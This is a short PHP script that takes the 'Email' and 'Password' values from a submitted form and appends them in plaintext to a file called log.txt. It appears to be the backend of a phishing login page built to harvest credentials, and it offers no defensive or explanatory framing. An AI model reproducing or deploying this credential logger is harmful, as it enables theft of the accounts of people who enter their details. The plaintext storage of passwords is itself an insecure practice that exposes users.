<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the values from the form
    $email = $_POST["Email"];
    $password = $_POST["Password"];

    // Open the file in append mode
    $file = fopen("log.txt", "a");

    // Write the email and password to the file
    fwrite($file, "Email: " . $email . "\tPassword: " . $password . "\n");

    // Close the file
    fclose($file);
}
?>
